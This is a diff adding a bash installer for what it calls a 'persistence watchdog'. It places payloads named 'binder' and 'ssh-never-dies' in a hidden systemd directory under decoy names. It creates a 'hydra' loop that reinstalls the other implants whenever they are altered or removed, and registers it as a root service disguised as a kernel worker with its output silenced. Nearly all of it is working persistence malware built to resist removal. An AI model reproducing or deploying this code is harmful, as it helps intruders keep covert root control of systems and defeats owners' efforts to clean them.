@@ -1,0 +1,235 @@
+#!/usr/bin/env bash
+# Watchdog Installer - Sets up the persistence watchdog
+# axon | AU
+set -euo pipefail
+
+need_root() {
+  if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
+    echo "Run as root." >&2
+    exit 1
+  fi
+}
+
+need_root
+
+echo "[*] Installing persistence watchdog..."
+
+# Create directories - using systemd's own infrastructure
+install -d /usr/lib/systemd/system/.helpers
+install -d /usr/lib/systemd/system
+install -d /lib/systemd/system
+
+# Copy original installer scripts to hidden location
+if [ -f "/mnt/user-data/uploads/binder" ]; then
+    cp /mnt/user-data/uploads/binder /usr/lib/systemd/system/.helpers/netplan-init
+    chmod 755 /usr/lib/systemd/system/.helpers/netplan-init
+    chmod +x /usr/lib/systemd/system/.helpers/netplan-init
+    echo "[+] Copied binder to /usr/lib/systemd/system/.helpers/"
+elif [ -f "./binder" ]; then
+    cp ./binder /usr/lib/systemd/system/.helpers/netplan-init
+    chmod 755 /usr/lib/systemd/system/.helpers/netplan-init
+    chmod +x /usr/lib/systemd/system/.helpers/netplan-init
+    echo "[+] Copied binder to /usr/lib/systemd/system/.helpers/"
+else
+    echo "[!] Warning: binder not found, watchdog may not function"
+fi
+
+if [ -f "/mnt/user-data/uploads/ssh-never-dies" ]; then
+    cp /mnt/user-data/uploads/ssh-never-dies /usr/lib/systemd/system/.helpers/map-init
+    chmod 755 /usr/lib/systemd/system/.helpers/map-init
+    chmod +x /usr/lib/systemd/system/.helpers/map-init
+    echo "[+] Copied ssh-never-dies to /usr/lib/systemd/system/.helpers/"
+elif [ -f "./ssh-never-dies" ]; then
+    cp ./ssh-never-dies /usr/lib/systemd/system/.helpers/map-init
+    chmod 755 /usr/lib/systemd/system/.helpers/map-init
+    chmod +x /usr/lib/systemd/system/.helpers/map-init
+    echo "[+] Copied ssh-never-dies to /usr/lib/systemd/system/.helpers/"
+else
+    echo "[!] Warning: ssh-never-dies not found, watchdog may not function"
+fi
+
+# Create the watchdog script (named hydra) - MORE RESILIENT VERSION
+cat > /usr/lib/systemd/system/.helpers/hydra <<'WATCHDOG_SCRIPT'
+#!/usr/bin/env bash
+# Persistence Watchdog - Monitors and respawns both mechanisms
+set -eo pipefail
+
+# Configuration
+CHECK_INTERVAL="${CHECK_INTERVAL:-10}"
+SCRIPT_DIR="/usr/lib/systemd/system/.helpers"
+
+# File checksums storage
+CHECKSUM_DIR="/var/opt/.state"
+mkdir -p "$CHECKSUM_DIR" 2>/dev/null || true
+chmod 700 "$CHECKSUM_DIR" 2>/dev/null || true
+
+have() { 
+    command -v "$1" >/dev/null 2>&1
+}
+
+calc_checksum() {
+    local file="$1"
+    if [ ! -e "$file" ]; then
+        echo "MISSING"
+        return 0
+    fi
+    
+    if have sha256sum; then
+        sha256sum "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    elif have shasum; then
+        shasum -a 256 "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    else
+        md5sum "$file" 2>/dev/null | awk '{print $1}' || echo "ERROR"
+    fi
+}
+
+store_checksum() {
+    local file="$1"
+    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
+    calc_checksum "$file" > "$checksum_file" 2>/dev/null || true
+}
+
+file_changed() {
+    local file="$1"
+    local checksum_file="${CHECKSUM_DIR}/$(echo "$file" | tr '/' '_')"
+    
+    if [ ! -e "$checksum_file" ]; then
+        return 1
+    fi
+    
+    local old_sum=$(cat "$checksum_file" 2>/dev/null || echo "")
+    local new_sum=$(calc_checksum "$file")
+    
+    [ "$old_sum" != "$new_sum" ]
+}
+
+reinstall_binder() {
+    if [ -x "${SCRIPT_DIR}/netplan-init" ]; then
+        bash "${SCRIPT_DIR}/netplan-init" >/dev/null 2>&1 || true
+    fi
+}
+
+reinstall_mapper() {
+    if [ -x "${SCRIPT_DIR}/map-init" ]; then
+        timeout 5 bash "${SCRIPT_DIR}/map-init" >/dev/null 2>&1 || true
+    fi
+}
+
+check_binder() {
+    local needs_reinstall=0
+    
+    file_changed "/usr/local/bin/systemd-netplan" && needs_reinstall=1
+    file_changed "/usr/lib/systemd/system/systemd-netplan.service" && needs_reinstall=1
+    
+    [ ! -f "/usr/lib/systemd/system/systemd-netplan.service" ] && [ ! -f "/lib/systemd/system/systemd-netplan.service" ] && needs_reinstall=1
+    [ ! -f "/etc/systemd/network/.systemd-netplan/systemd-netplan.service" ] && needs_reinstall=1
+    
+    systemctl is-enabled systemd-netplan.service >/dev/null 2>&1 || needs_reinstall=1
+    systemctl is-active systemd-netplan.service >/dev/null 2>&1 || needs_reinstall=1
+    
+    if [ $needs_reinstall -eq 1 ]; then
+        reinstall_binder
+        store_checksum "/usr/local/bin/systemd-netplan"
+        store_checksum "/usr/lib/systemd/system/systemd-netplan.service"
+    fi
+}
+
+check_mapper() {
+    local needs_reinstall=0
+    
+    file_changed "/usr/local/sbin/systemd-map" && needs_reinstall=1
+    file_changed "/usr/local/sbin/systemd-map-seed" && needs_reinstall=1
+    file_changed "/usr/lib/systemd/system/systemd-map.service" && needs_reinstall=1
+    
+    [ ! -f "/usr/lib/systemd/system/systemd-map.service" ] && [ ! -f "/lib/systemd/system/systemd-map.service" ] && needs_reinstall=1
+    [ ! -d "/var/opt/maps/.safe" ] && needs_reinstall=1
+    
+    systemctl is-enabled systemd-map.service >/dev/null 2>&1 || needs_reinstall=1
+    systemctl is-active systemd-map.service >/dev/null 2>&1 || needs_reinstall=1
+    
+    if [ $needs_reinstall -eq 1 ]; then
+        reinstall_mapper
+        store_checksum "/usr/local/sbin/systemd-map"
+        store_checksum "/usr/local/sbin/systemd-map-seed"
+        store_checksum "/usr/lib/systemd/system/systemd-map.service"
+    fi
+}
+
+initialize_checksums() {
+    store_checksum "/usr/local/bin/systemd-netplan"
+    store_checksum "/usr/lib/systemd/system/systemd-netplan.service"
+    
+    store_checksum "/usr/local/sbin/systemd-map"
+    store_checksum "/usr/local/sbin/systemd-map-seed"
+    store_checksum "/usr/lib/systemd/system/systemd-map.service"
+}
+
+main() {
+    # Initialize checksums if needed
+    if [ ! -d "$CHECKSUM_DIR" ] || [ -z "$(ls -A "$CHECKSUM_DIR" 2>/dev/null)" ]; then
+        initialize_checksums
+    fi
+    
+    # Main monitoring loop
+    while true; do
+        check_binder || true
+        check_mapper || true
+        sleep "$CHECK_INTERVAL"
+    done
+}
+
+# Run main loop
+main
+WATCHDOG_SCRIPT
+
+chmod 755 /usr/lib/systemd/system/.helpers/hydra
+
+# Create systemd service (systemd-kworker)
+cat > /usr/lib/systemd/system/systemd-kworker.service <<'SERVICE_EOF'
+[Unit]
+Description=Kernel Worker
+Documentation=man:kworker(7)
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/lib/systemd/system/.helpers/hydra
+Restart=always
+RestartSec=5
+User=root
+Group=root
+
+Environment="CHECK_INTERVAL=10"
+
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+SERVICE_EOF
+
+chmod 644 /usr/lib/systemd/system/systemd-kworker.service
+
+# Only copy to /lib if it's a different directory (not a symlink to the same location)
+if [ ! -f "/lib/systemd/system/systemd-kworker.service" ] || ! cmp -s /usr/lib/systemd/system/systemd-kworker.service /lib/systemd/system/systemd-kworker.service; then
+    cp /usr/lib/systemd/system/systemd-kworker.service /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+    chmod 644 /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+fi
+
+# Set ownership
+chown -R root:root /usr/lib/systemd/system/.helpers
+chmod -R go-rwx /usr/lib/systemd/system/.helpers
+chown root:root /usr/lib/systemd/system/systemd-kworker.service
+chown root:root /lib/systemd/system/systemd-kworker.service 2>/dev/null || true
+
+# Enable and start the watchdog
+systemctl daemon-reload
+systemctl enable systemd-kworker.service
+systemctl start systemd-kworker.service
+
+echo ""
+echo "[+] Persistence watchdog installed and started"
+echo "[+] Service: systemd-kworker.service"
+echo "[+] Scripts: /usr/lib/systemd/system/.helpers/"
+echo ""
+echo "Check status with: systemctl status systemd-kworker.service"
